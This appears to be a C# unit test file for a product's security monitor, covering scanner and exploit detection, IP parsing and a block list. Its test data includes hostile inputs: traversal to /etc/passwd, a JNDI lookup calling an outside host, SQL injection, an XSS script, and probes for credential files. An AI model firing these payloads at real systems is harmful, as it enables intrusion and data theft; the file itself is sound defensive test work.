using System.Net;
using Fleeto.Core.Domain;
using Fleeto.Core.Entities;
using Fleeto.Infrastructure.Security;
using Fleeto.Testing;
using Microsoft.Extensions.Time.Testing;
using Microsoft.Extensions.Logging.Abstractions;

namespace Fleeto.Infrastructure.Tests;

/// <summary>
/// The rules of the security monitor without a database (0.7.0): scanner probes and exploit attempts are recognised, also encoded
/// twice, while no route of Fleeto ever is; addresses are parsed into canonical networks and reserved ranges can never be blocked;
/// the list of blocked and allowed addresses answers by range, lets an allow win and a manual block outrank an automatic one,
/// forgets an expired block and blocks nothing until it is loaded.
/// </summary>
public sealed class SecurityMonitorRuleTests
{
    [Theory]
    [InlineData("/.env", ScannerVerdict.ScannerPath, true)]
    [InlineData("/.git/config", ScannerVerdict.ScannerPath, true)]
    [InlineData("/.aws/credentials", ScannerVerdict.ScannerPath, true)]
    [InlineData("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", ScannerVerdict.ScannerPath, true)]
    [InlineData("/wp-login.php", ScannerVerdict.ScannerPath, false)]
    [InlineData("/WP-ADMIN/", ScannerVerdict.ScannerPath, false)]
    [InlineData("/phpmyadmin/index.php", ScannerVerdict.ScannerPath, false)]
    [InlineData("/actuator/health", ScannerVerdict.ScannerPath, false)]
    [InlineData("/owa/auth/logon.aspx", ScannerVerdict.ScannerPath, false)]
    [InlineData("/backup.sql", ScannerVerdict.ScannerPath, false)]
    [InlineData("/index.jsp", ScannerVerdict.ScannerPath, false)]
    [InlineData("/%2e%2e/%2e%2e/etc/passwd", ScannerVerdict.AttackPattern, true)]
    [InlineData("/static/..%252f..%252fetc/passwd", ScannerVerdict.AttackPattern, true)]
    [InlineData("/cgi-bin/../../bin/sh", ScannerVerdict.AttackPattern, true)]
    public void Scanner_paths_and_exploits_are_recognised_where_no_route_exists(string path, ScannerVerdict verdict, bool certain)
    {
        var match = ScannerPatterns.Classify(path, null, "Mozilla/5.0", routeExists: false);
        Assert.Equal(verdict, match.Verdict);
        Assert.Equal(certain, match.HighConfidence);
    }

    [Theory]
    [InlineData("q=${jndi:ldap://203.0.113.9/a}")]
    [InlineData("id=1%20UNION%20SELECT%20password%20FROM%20users")]
    [InlineData("name=%3Cscript%3Ealert(1)%3C/script%3E")]
    [InlineData("file=..%2f..%2fwin.ini")]
    public void An_exploit_in_the_query_of_a_real_route_is_recognised(string query)
    {
        var match = ScannerPatterns.Classify("/api/v1/endpoints", query, "curl/8.0", routeExists: true);
        Assert.Equal(ScannerVerdict.AttackPattern, match.Verdict);
        Assert.True(match.HighConfidence);
    }

    [Theory]
    [InlineData("sqlmap/1.7.2#stable (https://sqlmap.org)")]
    [InlineData("Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)")]
    [InlineData("Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))")]
    [InlineData("Mozilla/5.0 zgrab/0.x")]
    public void A_scanning_tool_is_recognised_by_its_user_agent_on_any_path(string userAgent)
    {
        Assert.Equal(ScannerVerdict.ScannerAgent, ScannerPatterns.Classify("/account/login", null, userAgent, routeExists: true).Verdict);
    }

    [Theory]
    [InlineData("/", "")]
    [InlineData("/account/login", "returnUrl=%2Fclients")]
    [InlineData("/clients/7a1c4f0e-6a7e-4d5f-9b1b-0d3e2b1c9a11", "")]
    [InlineData("/settings/backups", "")]
    [InlineData("/setup", "token=abc123")]
    [InlineData("/agent/download/windows-amd64", "")]
    [InlineData("/api/v1/endpoints", "clientId=7a1c4f0e-6a7e-4d5f-9b1b-0d3e2b1c9a11&limit=50&search=cmd.exe")]
    [InlineData("/api/v1/openapi.json", "")]
    [InlineData("/_framework/blazor.web.js", "")]
    [InlineData("/_content/MudBlazor/MudBlazor.min.css", "")]
    [InlineData("/v1/connect", "")]
    [InlineData("/v1/enroll", "")]
    [InlineData("/v1/releases/0.7.0/fleeto-agent-linux-amd64.tar.gz", "")]
    [InlineData("/relay/browser/7a1c4f0e-6a7e-4d5f-9b1b-0d3e2b1c9a11", "")]
    public void A_route_of_fleeto_is_never_a_probe(string path, string query)
    {
        Assert.Equal(ScannerVerdict.None, ScannerPatterns.Classify(path, query, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", routeExists: true).Verdict);
    }

    [Fact]
    public void A_search_on_a_real_route_may_name_a_program_that_counts_only_where_nothing_is_served()
    {
        Assert.Equal(ScannerVerdict.None, ScannerPatterns.Classify("/api/v1/software", "search=powershell.exe", null, routeExists: true).Verdict);
        Assert.Equal(ScannerVerdict.AttackPattern, ScannerPatterns.Classify("/run", "c=powershell.exe", null, routeExists: false).Verdict);
    }

    [Theory]
    [InlineData("203.0.113.7", "203.0.113.7/32")]
    [InlineData(" 198.51.100.77/24 ", "198.51.100.0/24")]
    [InlineData("2001:db8:1:2:3:4:5:6/48", "2001:db8:1::/48")]
    [InlineData("::ffff:192.0.2.5", "192.0.2.5/32")]
    public void An_address_is_parsed_into_its_canonical_network(string text, string expected)
    {
        Assert.True(IpNetworks.TryParse(text, out var network));
        Assert.Equal(expected, IpNetworks.Format(network));
    }

    [Theory]
    [InlineData("")]
    [InlineData("rmm.example.com")]
    [InlineData("203.0.113.7/33")]
    [InlineData("203.0.113.7/-1")]
    [InlineData("203.0.113.7/ 24")]
    [InlineData("fe80::1%eth0")]
    public void Anything_else_is_not_an_address(string text) => Assert.False(IpNetworks.TryParse(text, out _));

    [Fact]
    public void An_attacker_is_one_ipv4_address_or_one_ipv6_64_and_a_sign_in_network_an_ipv4_24()
    {
        Assert.Equal("198.51.100.7/32", IpNetworks.Format(IpNetworks.AttackerNetwork(IPAddress.Parse("198.51.100.7"))));
        Assert.Equal("2a01:4f8:1:2::/64", IpNetworks.Format(IpNetworks.AttackerNetwork(IPAddress.Parse("2a01:4f8:1:2:aaaa:bbbb:cccc:dddd"))));
        Assert.Equal("198.51.100.0/24", IpNetworks.Format(IpNetworks.SignInNetwork(IPAddress.Parse("198.51.100.7"))));
    }

    [Theory]
    [InlineData("10.210.0.0/16", true)]
    [InlineData("172.0.0.0/8", true)]
    [InlineData("127.0.0.1", true)]
    [InlineData("100.64.1.1", true)]
    [InlineData("fd00::/8", true)]
    [InlineData("2a01:4f8::/32", false)]
    [InlineData("8.8.8.0/24", false)]
    public void Reserved_ranges_are_recognised_also_inside_a_wider_network(string text, bool reserved)
    {
        Assert.True(IpNetworks.TryParse(text, out var network));
        Assert.Equal(reserved, IpNetworks.TouchesReserved(network));
    }

    [Fact]
    public void A_network_wider_than_an_ipv4_8_or_an_ipv6_19_is_too_wide()
    {
        Assert.True(IpNetworks.TryParse("8.0.0.0/7", out var wide) && IpNetworks.IsTooWide(wide));
        Assert.False(IpNetworks.TryParse("8.0.0.0/8", out var ok) && IpNetworks.IsTooWide(ok));
        Assert.True(IpNetworks.TryParse("2a00::/16", out var wide6) && IpNetworks.IsTooWide(wide6));
    }

    private static IpBlockList NewList(FakeTimeProvider? time = null) =>
        new(null!, new InMemoryNotificationBus(), time ?? new FakeTimeProvider(DateTimeOffset.UtcNow), NullLogger<IpBlockList>.Instance);

    [Fact]
    public void Nothing_is_blocked_before_the_list_is_loaded()
    {
        Assert.Equal(IpVerdict.None, NewList().Check(IPAddress.Parse("81.2.71.7")));
    }

    [Fact]
    public void An_address_inside_a_blocked_network_is_blocked_and_an_allow_wins()
    {
        var list = NewList();
        list.Load(
        [
            ("81.2.69.0/24", IpBlockSource.Automatic, null),
            ("81.2.69.128/25", IpBlockSource.Manual, null),
            ("8.8.8.8/32", IpBlockSource.Automatic, null),
        ], ["81.2.69.200/32"]);

        Assert.Equal(IpVerdict.BlockedAutomatic, list.Check(IPAddress.Parse("81.2.69.10")));
        Assert.Equal(IpVerdict.BlockedManual, list.Check(IPAddress.Parse("81.2.69.130")));
        Assert.Equal(IpVerdict.Allowed, list.Check(IPAddress.Parse("81.2.69.200")));
        Assert.Equal(IpVerdict.BlockedAutomatic, list.Check(IPAddress.Parse("::ffff:8.8.8.8")));
        Assert.Equal(IpVerdict.None, list.Check(IPAddress.Parse("81.2.70.1")));
        Assert.Equal(IpVerdict.None, list.Check(IPAddress.Parse("8.8.8.9")));
    }

    [Fact]
    public void An_ipv6_block_holds_the_whole_64_and_ipv4_never_matches_ipv6()
    {
        var list = NewList();
        list.Load([("2a01:4f8:1:2::/64", IpBlockSource.Manual, null), ("0.0.0.1/32", IpBlockSource.Manual, null)], []);
        Assert.Equal(IpVerdict.BlockedManual, list.Check(IPAddress.Parse("2a01:4f8:1:2:ffff::1")));
        Assert.Equal(IpVerdict.None, list.Check(IPAddress.Parse("2a01:4f8:1:3::1")));
        Assert.Equal(IpVerdict.None, list.Check(IPAddress.Parse("::1")));
    }

    [Fact]
    public void An_expired_block_no_longer_blocks()
    {
        var time = new FakeTimeProvider(DateTimeOffset.UtcNow);
        var list = NewList(time);
        list.Load([("81.2.71.7/32", IpBlockSource.Automatic, time.GetUtcNow().UtcDateTime.AddHours(1))], []);
        Assert.Equal(IpVerdict.BlockedAutomatic, list.Check(IPAddress.Parse("81.2.71.7")));
        time.Advance(TimeSpan.FromHours(2));
        Assert.Equal(IpVerdict.None, list.Check(IPAddress.Parse("81.2.71.7")));
    }

    [Fact]
    public void A_reserved_range_in_the_table_is_never_loaded()
    {
        var list = NewList();
        list.Load([("10.0.0.0/8", IpBlockSource.Manual, null), ("172.16.0.0/12", IpBlockSource.Automatic, null), ("not an address", IpBlockSource.Manual, null)], []);
        Assert.Equal(0, list.BlockCount);
        Assert.Equal(IpVerdict.None, list.Check(IPAddress.Parse("172.20.0.5")));
    }

    [Fact]
    public void Many_overlapping_ranges_are_found_by_the_one_that_holds_the_address()
    {
        var list = NewList();
        var blocks = Enumerable.Range(0, 2000).Select(i => ($"45.{i / 250}.{i % 250}.0/24", IpBlockSource.Automatic, (DateTime?)null)).ToList();
        blocks.Add(("45.0.0.0/8", IpBlockSource.Manual, null));
        list.Load(blocks, []);
        Assert.Equal(IpVerdict.BlockedManual, list.Check(IPAddress.Parse("45.7.249.1")));
        Assert.Equal(IpVerdict.BlockedManual, list.Check(IPAddress.Parse("45.200.0.1")));
    }

    [Fact]
    public void The_recorder_counts_per_kind_and_attacker_network()
    {
        var recorder = new SecuritySignalRecorder("web", new FakeTimeProvider(DateTimeOffset.UtcNow));
        recorder.Record(SecuritySignalKind.ScannerPath, IPAddress.Parse("203.0.113.7"));
        recorder.Record(SecuritySignalKind.ScannerPath, IPAddress.Parse("::ffff:203.0.113.7"));
        recorder.Record(SecuritySignalKind.ScannerPath, IPAddress.Parse("2a01:4f8:1:2::1"));
        recorder.Record(SecuritySignalKind.ScannerPath, IPAddress.Parse("2a01:4f8:1:2::2"));
        recorder.Record(SecuritySignalKind.ApiKeyInvalid, IPAddress.Parse("203.0.113.7"), new string('k', 300));
        recorder.Record(SecuritySignalKind.NotFound, null);

        var counts = recorder.Current();
        Assert.Equal(2, counts[(SecuritySignalKind.ScannerPath, "203.0.113.7/32", null)]);
        Assert.Equal(2, counts[(SecuritySignalKind.ScannerPath, "2a01:4f8:1:2::/64", null)]);
        Assert.Equal(1, counts[(SecuritySignalKind.ApiKeyInvalid, "203.0.113.7/32", new string('k', SecuritySignalRecorder.MaxSubjectLength))]);
        Assert.Equal(3, counts.Count);
    }
}
